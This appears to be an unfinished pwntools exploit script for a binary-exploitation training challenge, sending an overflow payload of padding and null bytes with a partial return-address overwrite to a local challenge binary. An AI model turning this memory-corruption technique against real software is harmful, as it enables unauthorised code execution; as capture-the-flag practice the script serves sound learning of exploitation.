from pwn import *

offset = 80
win_bypass = 0x1704
save_addr = 0x19d4
main_addre = 0x194e

for i in "0123456789abcdef":
    r = process("/challenge/binary-exploitation-null-write")
    payload = 4 * b'A' + (offset - 4) * b'\0' + b'\xd4' #+ bytes.fromhex(f"{i}9")
    r.send(payload)
    # r.interactive()
    print(r.recvline())
    try:
        print(r.recvline(), Timeout=1)
    except:
        print('walo')